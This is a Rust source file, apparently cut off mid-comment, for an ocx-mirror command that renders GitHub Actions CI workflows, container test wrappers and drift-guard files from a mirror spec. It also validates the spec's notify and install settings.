// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The OCX Authors

//! `ocx-mirror package pipeline generate ci` — renders the GHA workflow and support
//! scripts from `mirror.yml` using baked-in templates.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use ocx_lib::cli::DataInterface;

use crate::command::package::options::OutputFormat;
use crate::command::package::pipeline::push;
use crate::error::MirrorError;
use crate::spec::{self, MirrorSpec, PlatformConfig, TestEntry};

// ── Renderer (native + container legs) ───────────────────────────────────────
//
// A platform without `containers:` renders a native leg (tests run on the GHA
// runner via the setup-ocx toolchain). A platform WITH `containers:` renders
// one leg per image: the job still runs on the host runner (so JS actions —
// checkout, artifact up/download — keep the glibc node GitHub mounts, which
// Alpine's musl userland cannot execute), and only the `ocx package test`
// invocation is wrapped in `docker run <image>` with a statically-linked ocx of
// the container's libc (musl for Alpine, gnu otherwise) mounted in. The env
// under test is self-contained (local layers) and pulls only its private
// interpreter from the registry anonymously.

// ── Build-time constants ─────────────────────────────────────────────────────

/// OCX-mirror crate version baked in at compile time.
const VERSION: &str = env!("CARGO_PKG_VERSION");

/// Short git SHA injected by `build.rs` via `OCX_GIT_SHA_SHORT`.
/// Falls back to `"unknown"` when the build environment has no git context.
const GIT_SHA_SHORT: &str = match option_env!("OCX_GIT_SHA_SHORT") {
    Some(sha) => sha,
    None => "unknown",
};

// ── Baked-in templates ───────────────────────────────────────────────────────

const WORKFLOW_TEMPLATE: &str = include_str!("templates/workflow.yml");
const DESCRIBE_TEMPLATE: &str = include_str!("templates/describe.yml");
const VERIFY_GENERATED_TEMPLATE: &str = include_str!("templates/verify-generated.yml");

// ── Public struct ────────────────────────────────────────────────────────────

/// Generate (or check) the CI workflow files for a mirror repository.
///
/// In write mode: renders `.github/workflows/<slug>.yml`,
/// `.github/workflows/<slug>.describe.yml`, and — unless the spec sets
/// `allow_manual_edits: true` — the `<slug>.verify-generated.yml` drift guard.
/// `<slug>` derives from the spec `name`, so multiple app specs coexist in one
/// mirror repo without colliding on fixed workflow filenames.
///
/// In `--check` mode: exits 65 (DataError) if any generated file drifts from
/// what would be produced; emits path-only hints to stderr.
#[derive(clap::Parser)]
pub struct GenerateCi {
    /// Path to the mirror spec file.
    #[arg(long, default_value = "./mirror.yml")]
    pub spec: PathBuf,

    /// Check mode: verify generated files are up-to-date; exit 65 on drift.
    #[arg(long)]
    pub check: bool,

    /// Output format for diagnostics.
    #[arg(long)]
    pub format: Option<OutputFormat>,
}

impl GenerateCi {
    pub async fn execute(&self, _printer: &DataInterface) -> Result<(), MirrorError> {
        // Phase 1: policy-level pre-flight before load_spec.
        //
        // Check for `ocx_install:` key in the raw YAML text. MirrorSpec uses
        // `#[serde(deny_unknown_fields)]` so load_spec would emit SpecInvalid (65),
        // but plan §1.8 requires SpecUsageError (64) for this specific case.
        // Peeking the raw bytes lets us intercept before serde rejects it.
        let raw = tokio::fs::read_to_string(&self.spec)
            .await
            .map_err(|e| MirrorError::SpecNotFound(format!("{}: {e}", self.spec.display())))?;

        if raw.lines().any(|line| {
            let trimmed = line.trim_start();
            trimmed.starts_with("ocx_install:") || trimmed == "ocx_install:"
        }) {
            return Err(MirrorError::SpecUsageError(
                "ocx binary is installed via direct release download; \
                 remove `ocx_install:` block. \
                 Override `OCX_BINARY_OVERRIDE` env var at workflow level for integration tests"
                    .to_string(),
            ));
        }

        // Phase 2: load and validate spec (structural validation).
        let spec = spec::load_spec(&self.spec).await?;

        // Phase 3: content-policy validation on the parsed spec.
        policy_check_notify(&spec)?;

        // Phase 4: render all generated files.
        let repo_root = self.spec.parent().unwrap_or(Path::new("."));
        // Spec basename drives the `on.paths` triggers and the drift-guard
        // `--check --spec` call so each app watches only its own spec. Paths in a
        // workflow's `on.paths` are repo-root-relative, and repo_root is the
        // spec's parent, so the basename is the correct relative reference.
        let spec_file = self
            .spec
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_else(|| "mirror.yml".to_string());
        let files = render(&spec, &spec_file)?;

        // Surface the discouraged opt-out so it is never silently in effect: the
        // drift guard is the only thing that keeps the generated workflows honest.
        if spec.allow_manual_edits {
            eprintln!(
                "note: allow_manual_edits is set — the generated-workflow drift guard \
                 (verify-generated.yml) is not emitted; hand-edits to generated workflows \
                 go unchecked (discouraged)"
            );
        }

        // Phase 5: write or check.
        if self.check {
            check_drift(&files, repo_root).await
        } else {
            write_files(&files, repo_root).await
        }
    }
}

// ── Policy validation ────────────────────────────────────────────────────────

/// Content-policy check on the `notify:` block.
///
/// Delegates to `spec::policy_check_notify` so the check logic lives in one place
/// and always returns `SpecUsageError (64)` for URL-literal webhook secrets.
/// `load_spec` already calls this before structural validation, so this call in
/// the renderer is a defence-in-depth guard for specs loaded via other paths.
fn policy_check_notify(spec: &MirrorSpec) -> Result<(), MirrorError> {
    let Some(notify) = &spec.notify else {
        return Ok(());
    };
    spec::policy_check_notify(notify)
}

/// The libc family for a container image, driving which statically-linked ocx
/// release binary the test leg mounts. Inferred from the image name: Alpine is
/// musl, everything else (Debian, Ubuntu, Fedora, …) is gnu.
///
// ponytail: name-prefix inference, not a spec field — the corpus needs exactly
// alpine(musl) + debian(gnu). Add an explicit `containers[].libc` to
// `ContainerConfig` if a musl image that isn't Alpine ever shows up.
fn container_libc_for_image(image: &str) -> &'static str {
    if image.starts_with("alpine") { "musl" } else { "gnu" }
}

/// The default shell inside a container image when the config omits one:
/// Alpine ships only BusyBox `sh`; the glibc distros carry `bash`.
fn container_shell_for_image(image: &str) -> &'static str {
    if image.starts_with("alpine") { "sh" } else { "bash" }
}

// ── Renderer ─────────────────────────────────────────────────────────────────

/// The kind of a rendered test entry — mirrors [`spec::TestKind`] but owns its
/// payload so it can outlive the spec borrow in `MatrixLeg`.
#[derive(Debug, Clone, PartialEq)]
enum RenderedTestKind {
    Command(String),
    Script(String),
    ScriptInline(String),
}

/// One rendered test entry carried in a matrix leg.
#[derive(Debug, Clone)]
struct RenderedTest {
    name: String,
    kind: RenderedTestKind,
}

/// Describes one matrix leg (test job matrix entry).
///
/// A native leg has an empty `container_image` and the sentinel `container_id`
/// `_native_`. A container leg carries the image, its libc family (which ocx
/// release binary to mount), and a stable `container_id` derived from the
/// config `id` or the slugified image. Downstream consumers (`pipeline push`,
/// `junit.rs`) key on `(version, platform, container)` triples in JUnit XML and
/// run-summary.json, so `container_id` stays meaningful in both modes.
struct MatrixLeg {
    platform: String,
    platform_slug: String,
    runner: String,
    container_id: String,
    /// Container image reference, or empty for a native leg.
    container_image: String,
    /// Container libc family (`musl`/`gnu`); empty for a native leg.
    container_libc: String,
    shell: String,
    tests: Vec<RenderedTest>,
}

/// Convert a slice of [`TestEntry`] into [`RenderedTest`] list.
///
/// Entries that fail `kind()` (i.e. validated-invalid specs that slip through)
/// are silently omitted — `validate_tests` is the authoritative gate.
fn render_tests(entries: &[TestEntry]) -> Vec<RenderedTest> {
    entries
        .iter()
        .filter_map(|t| {
            let kind = match t.kind() {
                Ok(spec::TestKind::Command(cmd)) => RenderedTestKind::Command(cmd.to_owned()),
                Ok(spec::TestKind::Script(p)) => RenderedTestKind::Script(p.display().to_string()),
                Ok(spec::TestKind::ScriptInline(src)) => RenderedTestKind::ScriptInline(src.to_owned()),
                Err(_) => return None,
            };
            Some(RenderedTest {
                name: t.name.clone(),
                kind,
            })
        })
        .collect()
}

/// Build the flat list of matrix legs from a `MirrorSpec`.
fn build_matrix(spec: &MirrorSpec) -> Vec<MatrixLeg> {
    let Some(platforms) = &spec.platforms else {
        return Vec::new();
    };

    let top_level_tests: Vec<RenderedTest> = render_tests(spec.tests.as_deref().unwrap_or(&[]));

    // Stable ordering: sort platform keys alphabetically so the generated YAML
    // is deterministic across runs.
    let mut platform_keys: Vec<&String> = platforms.keys().collect();
    platform_keys.sort();

    let mut legs = Vec::new();
    for platform_key in platform_keys {
        let config = &platforms[platform_key];
        let platform_slug = platform_key.replace('/', "_");

        let effective_tests: Vec<RenderedTest> = config
            .tests
            .as_deref()
            .map(render_tests)
            .unwrap_or_else(|| top_level_tests.clone());

        match config.containers.as_deref().filter(|c| !c.is_empty()) {
            // Container mode: one leg per image. The job runs on the host runner
            // (JS actions keep glibc node); only `ocx package test` runs inside
            // the image (see `render_test_run_steps`).
            Some(containers) => {
                for container in containers {
                    // Default id MUST come from push's canonical slug rule:
                    // this value names the uploaded junit file, and the push
                    // job rebuilds the same id from the spec to find it.
                    let container_id = container
                        .id
                        .clone()
                        .unwrap_or_else(|| push::image_to_container_id(&container.image));
                    let shell = container
                        .shell
                        .clone()
                        .unwrap_or_else(|| container_shell_for_image(&container.image).to_string());
                    legs.push(MatrixLeg {
                        platform: platform_key.clone(),
                        platform_slug: platform_slug.clone(),
                        runner: config.runner.clone(),
                        container_id,
                        container_image: container.image.clone(),
                        container_libc: container_libc_for_image(&container.image).to_string(),
                        shell,
                        tests: effective_tests.clone(),
                    });
                }
            }
            // Native leg: tests run directly on the GHA runner.
            None => {
                let shell = native_shell_for_platform(platform_key, config);
                legs.push(MatrixLeg {
                    platform: platform_key.clone(),
                    platform_slug: platform_slug.clone(),
                    runner: config.runner.clone(),
                    container_id: "_native_".to_string(),
                    container_image: String::new(),
                    container_libc: String::new(),
                    shell: shell.to_string(),
                    tests: effective_tests,
                });
            }
        }
    }
    legs
}

/// Determine the shell for a native test leg.
fn native_shell_for_platform<'a>(platform: &str, config: &'a PlatformConfig) -> &'a str {
    if let Some(shell) = &config.shell {
        return shell.as_str();
    }
    if platform.starts_with("windows") {
        "pwsh"
    } else {
        "bash"
    }
}

/// Render the GHA workflow YAML from a parsed spec.
///
/// Substitution uses a simple `str::replace` chain — no templating engine dep.
fn render_workflow(spec: &MirrorSpec, spec_file: &str, workflow_file: &str) -> String {
    let schedule_block = spec
        .versions
        .as_ref()
        .and_then(|v| v.poll_interval.as_ref())
        .map(|cron| format!("  schedule:\n    - cron: '{}'\n", cron))
        .unwrap_or_default();

    let release_tag = spec
        .ocx_mirror
        .as_ref()
        .and_then(|m| m.release_tag.as_ref())
        .map(|s| s.as_str())
        .unwrap_or("latest");

    // `webhook_secret` names the *GitHub Actions secret* that carries the
    // webhook URL — the rendered workflow maps it onto the conventional local
    // env var `OCX_MIRROR_DISCORD_HOOK`, which `pipeline notify` reads.
    let webhook_secret_name = spec
        .notify
        .as_ref()
        .and_then(|n| n.discord.as_ref())
        .map(|d| d.webhook_secret.as_str())
        .unwrap_or("OCX_MIRROR_DISCORD_HOOK");

    // The Discord user id is non-secret — inline it verbatim into the notify
    // job env. Absent → the placeholder collapses to nothing so the env block
    // carries only the webhook hook line.
    let discord_user_id_env = spec
        .notify
        .as_ref()
        .and_then(|n| n.discord.as_ref())
        .and_then(|d| d.user_id.as_ref())
        .map(|id| format!("\n          OCX_MIRROR_DISCORD_USER_ID: \"{id}\""))
        .unwrap_or_default();

    // Env-package sources (`pylock`, `pypi`) produce env packages (multi-layer
    // + composed metadata), not per-platform archive bundles, so the
    // prepare-job artifact gathering and the test-job package target differ.
    // Everything else in the workflow is source-agnostic. Archive/binary
    // output stays byte-identical.
    let is_env = spec.source.is_env();
    // `pypi` additionally derives a PEP 751 lock per version during the plan
    // phase (unlike `pylock`, whose lock is committed upfront) — only that
    // source needs the plan-job artifact upload widened to carry `locks/`.
    let is_pypi = matches!(spec.source, spec::Source::Pypi { .. });

    let matrix = build_matrix(spec);
    let matrix_entries = render_matrix_entries(&matrix);
    let plan_artifact_steps = plan_artifact_upload_steps(is_pypi);
    let prepare_flatten = prepare_flatten_script(is_env);
    let test_target_resolve = test_target_resolve_script(is_env);
    let test_run_steps = render_test_run_steps(&matrix, is_env);
    let target_identifier = format!("{}/{}", spec.target.registry, spec.target.repository);

    WORKFLOW_TEMPLATE
        .replace("{OCX_MIRROR_VERSION}", VERSION)
        .replace("{OCX_MIRROR_REV}", GIT_SHA_SHORT)
        .replace("{SPEC_FILE}", spec_file)
        .replace("{WORKFLOW_FILE}", workflow_file)
        .replace("{MIRROR_NAME}", &spec.name)
        .replace("{SCHEDULE_BLOCK}", &schedule_block)
        .replace("{PLAN_ARTIFACT_STEPS}", &plan_artifact_steps)
        .replace("{PREPARE_FLATTEN}", &prepare_flatten)
        .replace("{TEST_MATRIX_ENTRIES}", &matrix_entries)
        .replace("{TEST_TARGET_RESOLVE}", &test_target_resolve)
        .replace("{TEST_RUN_STEPS}", &test_run_steps)
        .replace("{TARGET_IDENTIFIER}", &target_identifier)
        .replace("{TARGET_REGISTRY}", &spec.target.registry)
        .replace("{WEBHOOK_SECRET_NAME}", webhook_secret_name)
        .replace("{DISCORD_USER_ID_ENV}", &discord_user_id_env)
        .replace("{OCX_MIRROR_RELEASE_TAG}", release_tag)
}

/// Render the YAML matrix `include:` entries for the test job.
///
/// Test commands are inlined as a YAML list so the workflow references them
/// via `${{ matrix.tests }}`. This ensures per-platform test overrides
/// (e.g. `cmake.exe --version` on `windows/amd64`) appear verbatim in the
/// generated YAML, satisfying golden-test assertions.
fn render_matrix_entries(legs: &[MatrixLeg]) -> String {
    let mut out = String::new();
    for leg in legs {
        out.push_str(&format!(
            "          - platform: {}\n            platform_slug: {}\n            runner: {}\n            container_id: {}\n",
            leg.platform, leg.platform_slug, leg.runner, leg.container_id,
        ));
        // Container legs carry the image + libc; native legs omit both keys so
        // native-only workflows stay byte-identical to the pre-container
        // renderer. A referenced-but-absent matrix key evaluates to "" in GHA,
        // which the test step's `container_image` guard reads as native mode.
        if !leg.container_image.is_empty() {
            out.push_str(&format!(
                "            container_image: {:?}\n            container_libc: {:?}\n",
                leg.container_image, leg.container_libc,
            ));
        }
        out.push_str(&format!("            shell: {}\n", leg.shell));
        // Inline the test entries so they are visible in the generated YAML.
        out.push_str("            tests:\n");
        for test in &leg.tests {
            match &test.kind {
                RenderedTestKind::Command(cmd) => {
                    out.push_str(&format!(
                        "              - name: {}\n                kind: command\n                command: {}\n",
                        test.name, cmd
                    ));
                }
                RenderedTestKind::Script(path) => {
                    out.push_str(&format!(
                        "              - name: {}\n                kind: script\n                script: {}\n",
                        test.name, path
                    ));
                }
                RenderedTestKind::ScriptInline(src) => {
                    // Use YAML block scalar `|` so multi-line Starlark survives.
                    // Each line of the inline source is indented 18 spaces
                    // (matrix entry indent 14 + 4 for block scalar body).
                    let indented = src
                        .lines()
                        .map(|line| format!("                  {line}"))
                        .collect::<Vec<_>>()
                        .join("\n");
                    out.push_str(&format!(
                        "              - name: {}\n                kind: script_inline\n                script_inline: |\n{indented}\n",
                        test.name
                    ));
                }
            }
        }
    }
    out
}

/// The ocx CLI release whose statically-linked binary is mounted into a
/// container test leg. Pinned (not `latest`) for reproducible generated
/// workflows; Renovate can bump it via the same customManager that pins the
/// baked action refs.
const OCX_CONTAINER_CLI_TAG: &str = "v0.4.1";

/// Render per-test shell commands for the `test` job's run step.
///
/// Each matrix leg runs all its tests for every discovered version. The
/// renderer emits a single shell block that iterates per-version.
///
/// A native leg (`container_image` empty) runs `ocx package test` directly on
/// the runner. A container leg provisions a libc-matched, statically-linked ocx
/// release binary and wraps every `ocx package test` in `docker run <image>`
/// with the workspace and that binary mounted in — so the test executes against
/// the target container's userland while JS actions keep the host's glibc node.
fn render_test_run_steps(legs: &[MatrixLeg], is_pylock: bool) -> String {
    if legs.is_empty() {
        return String::new();
    }

    // The package under test: for archive/binary legs a single bundle file;
    // for pylock env legs the composed metadata via `-m` plus the ordered wheel
    // layers as positional args (both resolved by `{TEST_TARGET_RESOLVE}`).
    let test_target = if is_pylock {
        r#"-m "${METADATA}" ${LAYERS}"#
    } else {
        r#""${BUNDLE}""#
    };

    // Emit the container wrapper only when a leg actually declares an image, so
    // native-only workflows stay byte-identical to the pre-container renderer
    // (no drift on the archive/native corpus). `{OCX_TEST}` is the test-command
    // prefix: `ocx_test package test` under container mode, plain
    // `ocx package test` otherwise.
    let has_container = legs.iter().any(|leg| !leg.container_image.is_empty());
    let (container_prelude, ocx_test) = if has_container {
        (
            r#"            # Container legs: provision a libc-matched ocx release binary once and
            # run `ocx package test` inside `docker run <image>`; native legs call
            # `ocx` directly. The env under test is self-contained (local layers);
            # only its private interpreter is pulled (anonymously) from the registry.
            CONTAINER_IMAGE="${{ matrix.container_image }}"
            if [ -n "${CONTAINER_IMAGE}" ]; then
              case "${{ matrix.platform }}" in
                linux/amd64) OCX_ARCH=x86_64 ;;
                linux/arm64) OCX_ARCH=aarch64 ;;
                *) echo "::error::container test legs are linux-only (got ${{ matrix.platform }})"; exit 1 ;;
              esac
              OCX_TRIPLE="${OCX_ARCH}-unknown-linux-${{ matrix.container_libc }}"
              OCX_CONTAINER_BIN="${RUNNER_TEMP}/ocx-${OCX_TRIPLE}/ocx"
              if [ ! -x "${OCX_CONTAINER_BIN}" ]; then
                curl -fsSL "https://github.com/ocx-sh/ocx/releases/download/{OCX_CLI_TAG}/ocx-${OCX_TRIPLE}.tar.xz" \
                  | tar -xJ -C "${RUNNER_TEMP}"
              fi
              # The gnu ocx verifies TLS against the system CA store, which a
              # minimal base image (e.g. debian:12) does not carry; mount the
              # runner's resolved bundle at the path ocx reads by default.
              # (The musl ocx bundles webpki roots, so this is a no-op there.)
              OCX_CA_BUNDLE=$(realpath /etc/ssl/certs/ca-certificates.crt 2>/dev/null || echo /etc/ssl/certs/ca-certificates.crt)
            fi
            ocx_test() {
              if [ -n "${CONTAINER_IMAGE}" ]; then
                docker run --rm -i --platform "${{ matrix.platform }}" \
                  -v "${GITHUB_WORKSPACE}:${GITHUB_WORKSPACE}" -w "${GITHUB_WORKSPACE}" \
                  -v "${OCX_CONTAINER_BIN}:/usr/local/bin/ocx:ro" \
                  -v "${OCX_CA_BUNDLE}:/etc/ssl/certs/ca-certificates.crt:ro" \
                  -e OCX_HOME=/tmp/ocx-home -e OCX_NO_UPDATE_CHECK=1 \
                  "${CONTAINER_IMAGE}" ocx "$@"
              else
                ocx "$@"
              fi
            }
"#,
            "ocx_test package test",
        )
    } else {
        ("", "ocx package test")
    };

    let body = r#"{CONTAINER_PRELUDE}            mkdir -p junit
            JUNIT_FILE="junit/junit-${VERSION}-${{ matrix.platform_slug }}-${{ matrix.container_id }}.xml"
            TESTS_JSON='${{ toJson(matrix.tests) }}'
            TEST_COUNT=$(echo "${TESTS_JSON}" | jq 'length')
            FAILURES=0
            CASES=""
            for i in $(seq 0 $((TEST_COUNT - 1))); do
              TEST_NAME=$(echo "${TESTS_JSON}" | jq -r ".[$i].name")
              TEST_KIND=$(echo "${TESTS_JSON}" | jq -r ".[$i].kind")
              START=$(date +%s)
              RC=0
              if [ "${TEST_KIND}" = "command" ]; then
                TEST_CMD=$(echo "${TESTS_JSON}" | jq -r ".[$i].command")
                {OCX_TEST} --platform "${{ matrix.platform }}" --identifier "{TARGET_IDENTIFIER}:${VERSION}" {TEST_TARGET} -- \
                  ${{ matrix.shell }} -c "${TEST_CMD}" || RC=$?
              elif [ "${TEST_KIND}" = "script" ]; then
                TEST_SCRIPT=$(echo "${TESTS_JSON}" | jq -r ".[$i].script")
                {OCX_TEST} --platform "${{ matrix.platform }}" --identifier "{TARGET_IDENTIFIER}:${VERSION}" {TEST_TARGET} \
                  --script "${TEST_SCRIPT}" || RC=$?
              else
                TEST_INLINE=$(echo "${TESTS_JSON}" | jq -r ".[$i].script_inline")
                printf '%s' "${TEST_INLINE}" | {OCX_TEST} --platform "${{ matrix.platform }}" --identifier "{TARGET_IDENTIFIER}:${VERSION}" {TEST_TARGET} \
                  --script - || RC=$?
              fi
              END=$(date +%s)
              DUR=$((END - START))
              if [ "${RC}" -eq 0 ]; then
                CASES="${CASES}    <testcase name=\"${TEST_NAME}\" classname=\"${VERSION}.${{ matrix.platform_slug }}.${{ matrix.container_id }}\" time=\"${DUR}\"/>\n"
              else
                CASES="${CASES}    <testcase name=\"${TEST_NAME}\" classname=\"${VERSION}.${{ matrix.platform_slug }}.${{ matrix.container_id }}\" time=\"${DUR}\"><failure type=\"NonZeroExit\" message=\"exit ${RC}\"/></testcase>\n"
                FAILURES=$((FAILURES + 1))
              fi
            done
            {
              echo '<?xml version="1.0" encoding="UTF-8"?>'
              echo "<testsuites>"
              echo "  <testsuite name=\"${VERSION}.${{ matrix.platform_slug }}.${{ matrix.container_id }}\" tests=\"${TEST_COUNT}\" failures=\"${FAILURES}\">"
              if [ -n "${CI_JOB_URL:-}" ]; then
                echo "    <properties>"
                echo "      <property name=\"ci.job.url\" value=\"${CI_JOB_URL}\"/>"
                echo "    </properties>"
              fi
              printf '%b' "${CASES}"
              echo "  </testsuite>"
              echo "</testsuites>"
            } > "${JUNIT_FILE}"
            echo "wrote ${JUNIT_FILE} (tests=${TEST_COUNT}, failures=${FAILURES})"
            if [ "${FAILURES}" -gt 0 ]; then
              exit 1
            fi
"#;
    body.replace("{CONTAINER_PRELUDE}", container_prelude)
        .replace("{OCX_TEST}", ocx_test)
        .replace("{TEST_TARGET}", test_target)
        .replace("{OCX_CLI_TAG}", OCX_CONTAINER_CLI_TAG)
}

/// The `discover` job's plan-artifact upload step(s), source-dependent.
///
/// Every source uploads `plan.json` in a `plan` artifact so the `prepare` legs
/// consume the already-resolved plan without re-crawling. A `pypi` source
/// additionally derives a PEP 751 lock per discovered version during this same
/// phase (`pipeline plan` writes to `./locks` by default, W2.A3) — that lock
/// must travel to `prepare` alongside `plan.json`, so the `plan` artifact's
/// `path:` widens to also carry `locks/`. A second `derived-locks` artifact
/// (90-day retention, `if-no-files-found: ignore` since a no-new-work run
/// leaves it empty) keeps the locks around for audit after the 1-day `plan`
/// artifact expires (`adr_pypi_lock_derivation.md`). Every other source keeps
/// today's single-path, single-artifact upload byte-identical. Emitted into
/// the `discover` job's step list at a 6-space indent.
fn plan_artifact_upload_steps(is_pypi: bool) -> String {
    if is_pypi {
        r#"      # Ship the resolved plan (asset URLs included) to the prepare legs so
      # they never re-run the source crawl — one crawl per run instead of N+1,
      # which blew the shared GitHub GraphQL points budget (issue #160). The
      # pypi source also derives a PEP 751 lock per discovered version during
      # this phase (`pipeline plan` writes to `./locks` by default); ship it
      # alongside plan.json so prepare never re-derives.
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a  # v7.0.1
        with:
          name: plan
          path: |
            plan.json
            locks/
          retention-days: 1
      # Long-retention copy of the derived locks for audit/debugging after the
      # 1-day plan artifact expires (see adr_pypi_lock_derivation.md).
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a  # v7.0.1
        with:
          name: derived-locks
          path: locks/
          retention-days: 90
          if-no-files-found: ignore"#
            .to_string()
    } else {
        r#"      # Ship the resolved plan (asset URLs included) to the prepare legs so
      # they never re-run the source crawl — one crawl per run instead of N+1,
      # which blew the shared GitHub GraphQL points budget (issue #160).
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a  # v7.0.1
        with:
          name: plan
          path: plan.json
          retention-days: 1"#
            .to_string()
    }
}

/// The prepare-job artifact-gathering script, source-dependent.
///
/// Archive/binary legs flatten each per-platform `bundle.tar.xz` (and its
/// metadata sibling) into a flat `bundles/` namespace keyed by
/// `bundle-{V}-{slug}`. Pylock legs copy the whole per-version env subtree
/// (`env-manifest.json` plus each `{slug}/` metadata + `layers/`) verbatim into
/// `bundles/{V}/`, so the push job's `enumerate_env_manifests` finds
/// `bundles/{V}/env-manifest.json` and resolves its version-dir-relative
/// layer/metadata paths against it. Emitted into the prepare `run:` block at a
/// 10-space indent.
fn prepare_flatten_script(is_pylock: bool) -> String {
    if is_pylock {
        // The pylock prepare dir is named by the raw version (no `+`→`_`
        // slugging — pylock versions carry no build metadata in the corpus).
        // The version subtree already carries relative manifest paths, so a
        // plain recursive copy is enough.
        r#"          V="${{ matrix.version.version }}"
          mkdir -p bundles
          if [ -d ".ocx-mirror/${V}" ]; then
            cp -R ".ocx-mirror/${V}" "bundles/${V}"
          fi"#
        .to_string()
    } else {
        r#"          # Flatten .ocx-mirror/{V}/{P}/bundle.tar.xz → bundles/bundle-{V}-{P_slug}.tar.xz
          # and copy the per-platform metadata.json written by `pipeline prepare`
          # as sibling so `ocx package test` auto-discovers the correct override
          # (e.g. metadata-darwin.json baked content) via its bundle→metadata
          # sibling convention. Do NOT copy the spec-level metadata.json from CWD
          # — that always contains the default path, not the platform override.
          V="${{ matrix.version.version }}"
          # `pipeline prepare` normalises the build separator `+` → `_` when
          # naming its on-disk version directory (OCI-tag safe slug); the
          # matrix value still carries the original `+`, so translate before
          # globbing into the platform tree.
          V_SLUG="${V//+/_}"
          mkdir -p bundles
          shopt -s nullglob
          for platform_dir in ".ocx-mirror/${V_SLUG}"/*/; do
            [ -d "${platform_dir}" ] || continue
            P_SLUG=$(basename "${platform_dir}")
            cp "${platform_dir}bundle.tar.xz" "bundles/bundle-${V}-${P_SLUG}.tar.xz"
            cp "${platform_dir}metadata.json" "bundles/bundle-${V}-${P_SLUG}-metadata.json"
          done"#
            .to_string()
    }
}

/// The per-version test-target resolution, source-dependent. Emitted just
/// before `{TEST_RUN_STEPS}` inside the test job's per-version loop, at a
/// 12-space indent, resolving the shell vars the test invocation references.
///
/// Archive/binary legs set `BUNDLE` (+ its `METADATA_SIBLING`) so
/// `ocx package test` receives a single bundle path. Pylock legs read the
/// version's `env-manifest.json`, select this leg's platform entry, and set
/// `METADATA` + `LAYERS` (version-dir-relative paths joined back onto the
/// downloaded artifact root) for the `-m <metadata> <layers…>` form.
fn test_target_resolve_script(is_pylock: bool) -> String {
    if is_pylock {
        // The jq resolution is guarded (`2>/dev/null || true`, `// empty`) so a
        // genuine miss — a version whose prepare leg failed and never uploaded
        // its env-manifest.json — reds THIS version attributably via the
        // `ocx package test … || RC=$?` capture below (empty METADATA/LAYERS →
        // ocx fails cleanly → one JUnit <failure>), rather than a bare jq exit
        // tripping the step's `set -e` and aborting every remaining version in
        // the loop with no JUnit written. Mirrors the archive path's
        // "genuine miss still reds" invariant.
        r#"            VERSION_DIR="bundles/${VERSION}"
            ENV_JSON=$(jq -c --arg p "${{ matrix.platform }}" '.envs[] | select(.platform == $p)' "${VERSION_DIR}/env-manifest.json" 2>/dev/null || true)
            METADATA="${VERSION_DIR}/$(printf '%s' "${ENV_JSON}" | jq -r '.metadata_path // empty' 2>/dev/null || true)"
            LAYERS=""
            for rel in $(printf '%s' "${ENV_JSON}" | jq -r '.layers[].path // empty' 2>/dev/null || true); do
              LAYERS="${LAYERS} ${VERSION_DIR}/${rel}"
            done"#
        .to_string()
    } else {
        r#"            BUNDLE="bundles/bundle-${VERSION}-${{ matrix.platform_slug }}.tar.xz"
            METADATA_SIBLING="${BUNDLE%.tar.xz}-metadata.json""#
            .to_string()
    }
}

/// Render the describe.yml catalog-publish workflow.
///
/// Lighter than `mirror.yml`: only the release-tag + target-registry
/// placeholders need substitution. The workflow itself triggers on changes to
/// `CATALOG.md`, `logo.*`, or `mirror.yml` and invokes
/// `ocx-mirror package pipeline describe` to publish the README + logo to the
/// `__ocx.desc` referrer tag on the target repository.
fn render_describe(spec: &MirrorSpec, spec_file: &str, slug: &str) -> String {
    let release_tag = spec
        .ocx_mirror
        .as_ref()
        .and_then(|m| m.release_tag.as_ref())
        .map(|s| s.as_str())
        .unwrap_or("latest");

    DESCRIBE_TEMPLATE
        .replace("{OCX_MIRROR_VERSION}", VERSION)
        .replace("{OCX_MIRROR_REV}", GIT_SHA_SHORT)
        .replace("{OCX_MIRROR_RELEASE_TAG}", release_tag)
        .replace("{SPEC_FILE}", spec_file)
        .replace("{SLUG}", slug)
        .replace("{TARGET_REGISTRY}", &spec.target.registry)
}

/// Render the `verify-generated.yml` drift-guard workflow.
///
/// The workflow runs `ocx-mirror package pipeline generate ci --check` on pull requests
/// and pushes, so a hand-edit to any generated workflow fails CI. Emitted unless
/// the spec opts out via `allow_manual_edits` (see [`render`]); only the header
/// placeholders need substitution — the body is spec-independent.
fn render_verify_generated(spec_file: &str, slug: &str) -> String {
    VERIFY_GENERATED_TEMPLATE
        .replace("{OCX_MIRROR_VERSION}", VERSION)
        .replace("{OCX_MIRROR_REV}", GIT_SHA_SHORT)
        .replace("{SPEC_FILE}", spec_file)
        .replace("{SLUG}", slug)
}

/// Filesystem-safe slug derived from a spec's `name`, used to namespace the
/// generated workflow files so multiple app specs coexist in one mirror repo.
///
/// One repo holds N app specs (the corpus lives in a single `mirror-pypi`), and
/// two apps cannot both own `.github/workflows/mirror.yml`. Each app's workflows
/// are keyed by this slug instead. Any character outside `[A-Za-z0-9._-]` is
/// collapsed to `-` (spec names are already slug-shaped in practice — this is a
/// defence-in-depth guard against a name that would escape the filename).
fn workflow_slug(name: &str) -> String {
    let slug: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
                c
            } else {
                '-'
            }
        })
        .collect();
    // Never emit an empty or dot-only basename.
    if slug.trim_matches(['.', '-', '_']).is_empty() {
        "mirror".to_string()
    } else {
        slug
    }
}

/// Build the full map of relative path → file content for all generated files.
///
/// Keys are relative to the repo root (i.e. the spec file's parent directory).
/// `spec_file` is the spec's basename (e.g. `black.mirror.yml`) — injected into
/// the generated `on.paths` triggers and the drift-guard `--check --spec` call so
/// each app's workflows watch and re-render only their own spec.
fn render(spec: &MirrorSpec, spec_file: &str) -> Result<BTreeMap<PathBuf, String>, MirrorError> {
    let mut files: BTreeMap<PathBuf, String> = BTreeMap::new();
    let slug = workflow_slug(&spec.name);

    // ponytail: write-without-prune. Because filenames are now slug-keyed (not the
    // fixed mirror.yml/describe.yml trio), renaming a spec's `name` or deleting a
    // spec ORPHANS the old `<oldslug>.*` workflows — write_files never removes and
    // check_drift only inspects the current spec's render map, so orphans keep
    // running as live publish workflows outside every drift guard (a fail-open of
